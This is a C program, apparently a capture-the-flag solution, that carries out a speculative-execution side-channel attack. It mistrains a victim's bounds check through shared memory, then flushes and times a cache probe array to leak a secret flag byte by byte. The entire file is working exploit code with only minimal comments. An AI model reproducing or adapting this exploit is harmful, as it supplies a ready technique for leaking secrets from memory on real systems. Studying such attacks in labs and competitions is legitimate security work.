#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <semaphore.h>
#include <unistd.h>
#include <x86intrin.h>

#define SHARED_MEMORY_BASE 0x1337000


// Time how long it takes to access memory
uint64_t time_memory_access(void *addr) {
	// Wait for all previous operations
	_mm_mfence();  
	
	
	uint64_t start = __rdtsc();
	
	
	volatile char dummy = *(volatile char*)addr;  // Access the memory

	// Wait for this operation to complete
	_mm_mfence();  
	
	
	uint64_t end = __rdtsc();
	
	
	return end - start;
}

// remove all printable characters from the cache
void pre_work() {

	for (int ascii = 32; ascii <= 126; ascii++) {  // All printable ASCII
	
		void *page_addr = (void*)(0x1338000 + ascii * 0x1000);
		
		_mm_clflush(page_addr);
		
	}
	
	_mm_mfence();  // Wait for all flushes to complete
	
}


// Check which page is fastest (in cache)
void post_work(char *best_character, uint64_t *fastest_time) {

    for (int ascii = 32; ascii <= 126; ascii++) {
    
        void *page_addr = (void*)(0x1338000 + ascii * 0x1000);
        
        uint64_t access_time = time_memory_access(page_addr);
        
        // If this is the fastest access, it's probably our character
        if (access_time < *fastest_time) {
        
            *fastest_time = access_time;
            
            *best_character = ascii;
            
        }
    }
}


void train_target(int *flag_position, sem_t *semaphore) {

	for (int i = 0; i < 4000; i++) {
		*flag_position = 300;  // Value > 257, condition will be true
		sem_post(semaphore);
		//usleep(100);
	}
}

     
int main() {
	printf("Starting Flush+Reload attack...\n");

	// Get pointers to shared memory
	sem_t *semaphore = (sem_t*)SHARED_MEMORY_BASE;

	int *flag_position = (int*)(SHARED_MEMORY_BASE + sizeof(sem_t));

	char recovered_flag[100] = {0};
    
	// Attack each character position
	for (int pos = 0; pos < 60; pos++) {
    
		printf("Attacking position %d: ", pos);
		
		char best_character = 0;
		
		uint64_t fastest_time = 999999;

		for (int attempt = 0; attempt < 4000; attempt++) {
	    
			// flush first
			pre_work();

			// trianing phrase
			train_target(flag_position, semaphore);
			
			usleep(100);
			
			// flush again
			pre_work();
			
			// set the pos 
			*flag_position = pos;
			
			// now try to access again 
			sem_post(semaphore);
						
			usleep(100);  // Give victim time to run
			
			
			// STEP 3: RELOAD
			post_work(&best_character, &fastest_time);
		}
        
		recovered_flag[pos] = best_character;
		printf("'%c' (time: %lu cycles)\n", best_character, fastest_time);

		// Stop if we hit end of string or timing looks wrong
		if (best_character == 0 || fastest_time > 400) {
			break;
		}
    }
    
    printf("\nRecovered flag: %s\n", recovered_flag);
    return 0;
}
